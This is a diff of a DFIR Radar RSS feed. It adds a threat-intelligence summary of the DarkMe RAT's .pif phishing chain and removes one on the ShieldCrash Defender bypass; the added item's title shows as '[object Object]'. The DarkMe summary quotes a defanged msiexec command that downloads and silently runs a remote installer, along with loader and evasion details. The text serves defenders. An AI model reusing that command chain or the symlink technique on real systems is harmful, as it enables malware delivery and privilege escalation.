@@ -5,8 +5,25 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Wed, 23 Sep 2026 02:02:35 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 23 Sep 2026 08:03:29 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>[object Object]</title>
+      <link>https://www.huntress.com/blog/darkme-rat-abandons-exploits</link>
+      <description>Water Hydra's DarkMe RAT drops zero-day delivery for plain .pif phishing, reaching beyond forex traders into corporate environments. The loader chain is unchanged; only the entry point got cheaper.
+
+- Water Hydra (EvilNum/DarkCasino) swapped CVE-2023-38831 and CVE-2024-21412 for a malspam link pointing to image.pif (SHA256: 394c93df...), a PE32+ binary Windows executes on double-click. The .pif extension is a DOS-era relic with no legitimate modern use, making any execution event an immediate hunt priority. The file was masqueraded as a PNG and delivered from readonline365[.]com and four other hosts, all scoring 0 malicious on VirusTotal at discovery.
+
+- The chain: PIF spawns msiexec /i hxxps://onlineview365[.]com/propi.msi /quiet, which drops components to %AppData%\ComponentsFolder\ via EXPAND.EXE, runs prnfig.wsf to write a COM registration (CLSID {CFDC57BA-1705-45AF-BA10-EFC3D592982B}) via reg.exe import, then fires rundll32.exe /sta {CLSID}, an opaque invocation with no DLL path on the command line, through three VB6 loader DLLs: Coconout.dll, Use.dll (FillText), and Finalized.dll (Calculation).
+
+- Use.dll gates on a 329-app process list containing wallets, trading terminals, game launchers, and RGB utilities but zero analysis tools. This is an inverted sandbox check: no Steam or Slack means no real user, and execution stops cleanly.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2102670170036801810</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2102670170036801810">DFIR Radar</source>
+      <pubDate>Wed, 23 Sep 2026 08:03:29 +0000</pubDate>
+      <guid isPermaLink="false">2102670170036801810</guid>
+    </item>
     <item>
       <title>EvilTokens PhaaS disrupted after compromising 12,000 Microsoft accounts</title>
       <link>https://www.bleepingcomputer.com/news/security/eviltokens-phaas-disrupted-after-compromising-12-000-microsoft-accounts/</link>
@@ -1587,23 +1604,6 @@ Key details:
       <source url="https://x.com/DFIR_Radar/status/2100239466963304478">DFIR Radar</source>
       <pubDate>Wed, 16 Sep 2026 15:04:44 +0000</pubDate>
       <guid isPermaLink="false">2100239466963304478</guid>
-    </item>
-    <item>
-      <title>One Patch Behind: Nightmare-Eclipse's ShieldCrash and the Defender Bypass That Won't Stay Fixed</title>
-      <link>https://www.levelblue.com/blogs/spiderlabs-blog/one-patch-behind-nightmare-eclipses-shieldcrash-and-the-defender-bypass-that-wont-stay-fixed</link>
-      <description>Nightmare-Eclipse drops ShieldCrash, a third-generation Windows Defender privilege-escalation PoC that survived both Microsoft's July and September 2026 patches. The same object-manager abuse mechanism has now outlasted two remediation rounds.
-
-- ShieldCrash is the follow-on to ShieldBreak (CVE-2026-69414, patched September 2026), which itself bypassed RoguePlanet (patched July 2026). All three exploit the same object-manager mount-and-symlink path into Defender's shadow scanning subsystem. The actor released it as a deliberate skeleton: LevelBlue testing confirmed it returns ntdll.dll regardless of target, not a working arbitrary-file-read primitive, but the mechanism is real and fires live Defender detections.
-
-- Staging artifacts are consistent and actionable. Every run created three ShieldCrash_GUID directories, two under C:\ and one in %TEMP%. On incomplete runs, C:\ShieldCrash_GUID folders held archives containing bfsvc.exe, eicar.com, and mrkaspy.jpg. One folder carried Everyone: Full Control permissions despite running as a standard user, a significant anomaly.
-
-- The object-manager chain is the durable detection target. EDR telemetry (SentinelOne and CrowdStrike) recorded C:\ShieldCrash_GUID mounted to \BaseNamedObjects\Restricted, then a symlink from \BaseNamedObjects\Restricted\BERN:stream to sensitive paths like C:\Windows\System32\config\ELAM. On an unpatched Windows 11 asset, MsMpEng.exe was observed reading the specified target file directly.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2100224226657521775</description>
-      <category>VULNERABILITY</category>
-      <source url="https://x.com/DFIR_Radar/status/2100224226657521775">DFIR Radar</source>
-      <pubDate>Wed, 16 Sep 2026 14:04:11 +0000</pubDate>
-      <guid isPermaLink="false">2100224226657521775</guid>
     </item>
   </channel>
 </rss>
